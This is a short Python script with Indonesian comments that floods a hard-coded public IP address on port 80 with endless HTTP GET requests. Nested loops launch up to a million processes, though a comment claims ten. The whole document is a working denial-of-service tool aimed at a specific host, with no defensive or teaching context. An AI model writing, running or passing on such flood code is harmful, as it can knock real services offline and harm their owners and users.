import multiprocessing
import socket

# Konfigurasi target
target_ip = "138.201.139.144"
target_port = 80

# Fungsi untuk mengirim request
def send_request():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto(b"GET / HTTP/1.1\r\nHost: 138.201.139.144\r\n\r\n", (target_ip, target_port))
            s.close()
        except Exception as e:
            print(f"Error: {e}")

# Buat 10 proses untuk mengirim request
processes = []
for i in range(10):
    for j in range(100000):
        p = multiprocessing.Process(target=send_request)
        processes.append(p)
        p.start()

# Tunggu semua proses selesai
for p in processes:
    p.join()
